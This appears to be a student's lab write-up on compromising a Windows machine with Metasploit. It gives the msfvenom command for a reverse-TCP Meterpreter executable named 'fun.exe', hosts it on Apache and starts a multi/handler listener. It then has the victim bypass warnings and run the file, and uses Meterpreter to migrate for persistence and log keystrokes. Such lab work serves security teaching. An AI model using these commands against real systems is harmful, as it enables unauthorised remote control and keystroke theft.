# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM
```
TESTED BY: P G KUSHALI
REG NO: 212223230110
```

Find the attackers ip address using ifconfig

## OUTPUT

![image](https://github.com/user-attachments/assets/126e050f-2a49-4e40-84fb-e28d9746f214)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

![image](https://github.com/user-attachments/assets/d2436295-6f7e-48b8-b342-53a93e14b5d3)

Copy the fun.exe into the apache /var/www/html folder

## OUTPUT

![image](https://github.com/user-attachments/assets/08fa7d3d-7f2e-4898-b1e1-ed5f7f0c6a1c)

Start apache server sudo systemctl apache2 start

## OUTPUT

![image](https://github.com/user-attachments/assets/ccf4aa09-74ee-4bc1-9fa6-3a04fd6b43b4)

Check the status of apache2

![image](https://github.com/user-attachments/assets/ef5ee7ac-f08b-4a16-92b1-d516558bf4e9)

Invoke msfconsole:

## OUTPUT

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/user-attachments/assets/87185c5a-a947-4e29-a7fd-ef552903bded)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/9cec3616-ddef-46f7-9382-157beffa3f4f)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/user-attachments/assets/de1e69fb-e32a-49b5-ad54-8110e5ffb764)

o see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/user-attachments/assets/8bad2086-3008-43a5-a012-3e2111332eb6)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/b639c97f-3e46-4a45-a6ca-bfcbd4c1044f)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/5692ebde-debe-4681-88fc-7e1aca141078)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
